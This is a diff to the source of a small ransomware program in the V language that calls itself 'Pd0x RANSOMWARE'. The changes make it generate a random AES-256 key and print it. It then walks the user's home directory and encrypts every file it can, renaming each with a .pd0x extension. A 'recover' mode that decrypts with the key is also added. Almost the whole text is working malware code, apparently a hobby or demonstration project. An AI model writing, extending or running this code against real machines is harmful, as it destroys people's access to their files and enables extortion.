@@ -1,9 +1,12 @@
 import os
+import rand
 import simple_aes
 import crypto.aes
+import crypto.cipher
+import encoding.base64
 
 __global (
-	aes_cipher = aes.new_cipher('canGHd9zH_8gj7lFVyOz1G2K_1Gh6Gua'.bytes())
+	aes_cipher cipher.Block
 	threads_count = 0
 	color = '\033[35m'
 	reset = '\033[0m'
@@ -39,33 +42,34 @@ fn encrypt_file(file string) {
 
 	if write_file(file, encrypted) {
 		os.mv(file, file + '.pd0x') or { return }
-		print('\r[+] ${fix_length(file, 100)}')
+		print('\r[E] ${fix_length(file, 100)}')
 	}
 }
 
-/*
+
 fn decrypt_file(file string) {
+	defer { threads_count -= 1 }
 	if !os.is_writable(file) || !os.is_readable(file) || os.file_ext(file) != '.pd0x' {return}
 
-	data := os.read_bytes(file) or { 
-		eprintln('Failed to read ${file} content')
-		return
-	}
+	data := os.read_bytes(file) or { return }
 
 	decrypted := simple_aes.decrypt(aes_cipher, data)
 
 	if write_file(file, decrypted) {
-		os.mv(file, file[..file.len-5]) or {
-			eprintln('Failed to move ${file}')
-			return
-		}
-		println('Succesfully decrypted ${file}')
+		os.mv(file, file[..file.len-5]) or { return }
+		print('\r[D] ${fix_length(file, 100)}')
 	}
 }
-*/
 
-fn process_file(file string) {
+
+fn process_file_enc(file string) {
 	spawn encrypt_file(file)
+	threads_count += 1
+	for threads_count > 20 {}
+}
+
+fn process_file_dec(file string) {
+	spawn decrypt_file(file)
 	threads_count += 1
 	for threads_count > 20 {}
 }
@@ -90,10 +94,26 @@ fn main() {
 	println('P::::::::P          d:::::::::ddd::::d   00:::::::::00    x:::::x    x:::::x ')
 	println('PPPPPPPPPP           ddddddddd   ddddd     000000000     xxxxxxx      xxxxxxx${reset}')
 
-	println('This is ${color}Pd0x RANSOMWARE${reset}, type "execute" to run it')
-	confirmation := os.input('> ${color}')
+	println('Type ${color}"execute"${reset} to run the ransomware')
+	println('Type ${color}"recover"${reset} to recover your data')
+	cmd := os.input('> ${color}')
 	print(reset)
-	if confirmation != "execute" { return }
 
-	os.walk(os.home_dir(), process_file)
+	if cmd == "execute" {
+		aes_key := rand.bytes(32) or {panic(err)}
+		aes_cipher = aes.new_cipher(aes_key)
+
+		println('AES-256 Session Key: ${color}${base64.encode(aes_key)}${reset}')
+
+		os.walk(os.home_dir(), process_file_enc)
+	} else if cmd == "recover" {
+		key := os.input('Please enter a valid AES-256 key\n> ${color}')
+		print(reset)
+
+		aes_cipher = aes.new_cipher(base64.decode(key))
+
+		os.walk(os.home_dir(), process_file_dec)
+	}
+
+	for threads_count > 0 {}
 }
